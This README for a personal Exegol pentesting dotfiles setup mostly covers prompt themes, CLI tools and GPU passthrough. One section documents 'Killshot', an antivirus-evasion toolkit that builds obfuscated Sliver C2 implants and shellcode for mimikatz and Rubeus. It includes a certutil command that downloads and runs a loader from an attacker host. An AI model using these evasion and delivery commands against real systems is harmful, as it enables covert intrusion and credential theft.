# P3ta Exegol Configuration

Personal Exegol dotfiles and setup scripts for a customized pentesting environment.

## Features

- **Starship prompt** with Catppuccin Mocha theme and Exegol indicator
- **Modern CLI tools**: eza, bat, fd, zoxide, delta, zellij
- **Zellij** terminal multiplexer with auto plugin permissions
- **Shared history** across Zellij panes (syncs on Enter or Ctrl+H)
- **Burp Suite Pro** license persistence
- **Sliver C2** armory extensions persistence (auto-backup on shell exit)

## Scripts Overview

| Script | Where to Run | Purpose |
|--------|--------------|---------|
| `install.sh` | Host | Full installer - copies everything to `~/.exegol/my-resources/` |
| `setup-dotfiles.sh` | Host | Syncs just configs to my-resources |
| `install-tools.sh` | Container | Downloads/installs CLI tools (starship, eza, bat, etc.) |
| `load_user_setup.sh` | Container (auto) | Runs on first container start, calls install-tools.sh |
| `gpu/install-gpu.sh` | Host | Detects NVIDIA GPU/driver, sets up container GPU passthrough |
| `gpu/setup-gpu.sh` | Container (auto) | Configures OpenCL/CUDA inside container, matches host driver |

## Quick Start

### 1. Clone this repo

```bash
git clone https://github.com/p3ta00/p3ta_exegol.git ~/dev/p3ta_exegol
cd ~/dev/p3ta_exegol
```

### 2. Run the installer

```bash
./install.sh
```

This copies all configs to `~/.exegol/my-resources/`

### 3. Start an Exegol container

```bash
exegol start mybox
```

Everything loads automatically via the zshrc that Exegol sources.

## Directory Structure

```
p3ta_exegol/
├── avbypass/
│   ├── killshot.sh        # Main killshot CLI (bash)
│   ├── gen_runner.py      # Polymorphic Go runner generator
│   └── killshot.py        # Tool-specific shellcode generator
├── configs/
│   ├── starship.toml      # Starship prompt config
│   ├── zshrc              # Custom zsh config (auto-sourced by Exegol)
│   ├── load_user_setup.sh # First-start setup (runs automatically)
│   └── zellij/            # Zellij config with plugins
├── gpu/
│   ├── install-gpu.sh     # Host-side: detect GPU, write config, patch startup
│   └── setup-gpu.sh       # Container-side: match driver, fix symlinks, OpenCL
├── install.sh             # Full installer (run on host)
├── setup-dotfiles.sh      # Config sync only (run on host)
├── install-tools.sh       # CLI tool installer (run in container)
└── README.md
```

## What Gets Installed

| Tool | Description | Alias |
|------|-------------|-------|
| starship | Modern shell prompt | - |
| eza | Modern `ls` replacement | `ls`, `ll`, `la`, `lt` |
| bat | Modern `cat` replacement | `cat`, `catp` |
| fd | Modern `find` replacement | `fd` |
| zoxide | Smarter `cd` command | `z` |
| delta | Better git diffs | `diff` |
| zellij | Terminal multiplexer | `zj` |

All tools install to `/opt/my-resources/bin/` which persists across containers.

## Persistence Features

### Burp Suite Pro
License/config auto-restores from `setup/burp-config/` on new containers.

```bash
burppro    # Launch Burp Suite Pro
```

### Sliver C2
Armory extensions auto-backup on shell exit to `setup/sliver/`.
Restores automatically on new containers. Sliver daemon auto-starts on container boot.

### Killshot — Polymorphic AV Bypass Toolkit

Converts tools and C2 implants to in-memory shellcode via Donut + a polymorphic Go loader. Each build randomizes variable names, obfuscates API strings, injects junk functions, patches ETW, and compiles through garble.

Output goes to `/workspace/killshot` (exegol) or `~/killshot` (other).

```bash
# Generate Sliver beacon + runner
killshot generate -l 10.10.14.5 --implant -p 443

# Generate interactive session instead of beacon
killshot generate -l 10.10.14.5 --implant -p 443 -t session

# Just the runner (polymorphic loader)
killshot generate --runner

# Just the implant
killshot generate -l 10.10.14.5 --implant

# Generate everything (implant + runner + stager + tools)
killshot generate -l 10.10.14.5 --all

# Convert a specific tool to shellcode
killshot tool SharpHound --params "-c All"
killshot tool Rubeus --params "kerberoast"
killshot tool mimikatz

# List available tools
killshot list

# Serve payloads
killshot serve
```

**Delivery on target:**
```powershell
certutil -urlcache -split -f http://LHOST:8000/runner.exe %TEMP%\r.exe
%TEMP%\r.exe -remote http://LHOST:8000/implant.enc
```

**Beacon vs Session:**
- `beacon` (default) — periodic check-in, stealthier, use `interactive` in sliver to upgrade
- `session` — real-time interactive shell, noisier but supports `shell` command directly

### History Sharing
ZSH history syncs across Zellij panes:
- Syncs automatically when you press Enter
- Press `Ctrl+H` to manually sync

## Zellij Usage

```bash
zj                        # Start zellij
Ctrl+a then n             # New pane
Ctrl+a then x             # Close pane
Alt+left/right            # Switch panes
Alt+n                     # New pane
Alt+f                     # Toggle floating pane
```

## Updating Configs

After making changes:

```bash
cd ~/dev/p3ta_exegol
./setup-dotfiles.sh       # Sync to my-resources
git add -A && git commit -m "Update configs" && git push
```

New containers will pick up changes automatically.

## GPU Passthrough (hashcat, john, etc.)

Supports Arch/CachyOS, Fedora/Nobara, Debian/Ubuntu/Kali - any host with NVIDIA GPU.

### Prerequisites
- NVIDIA drivers installed on host
- nvidia-container-toolkit installed (script will guide you if missing)
- Docker configured with NVIDIA runtime

### Setup
```bash
# Run on your HOST (once, and again after driver updates)
./gpu/install-gpu.sh
```

This will:
1. Detect your GPU model, driver version, CUDA version
2. Write `gpu-host.conf` to `~/.exegol/my-resources/setup/gpu/`
3. Copy `setup-gpu.sh` to my-resources
4. Patch `load_user_setup.sh` to auto-run GPU setup on container start

### Usage
```bash
# Start Exegol with GPU passthrough
exegol start mybox full --gpu

# Inside the container - verify GPU
gpu-check            # Show clinfo + hashcat device info
gpu-test             # hashcat MD5 benchmark
gpu-info             # nvidia-smi
gpu-watch            # live nvidia-smi monitor
```

### After Driver Updates
Re-run `install-gpu.sh` on the host. The container script will warn if there's a version mismatch between what it expects and what's mounted.

---

## Troubleshooting

### Starship not loading
The zshrc should handle this automatically. If not:
```bash
source ~/.zshrc
```

### Tools not found
Run the installer inside the container:
```bash
/opt/my-resources/setup/install-tools.sh
```

### Prompt looks wrong
Make sure you're using a Nerd Font in your terminal.

### Zellij plugins asking for permissions
The config includes `auto_accept_permissions true` - restart zellij if prompted.
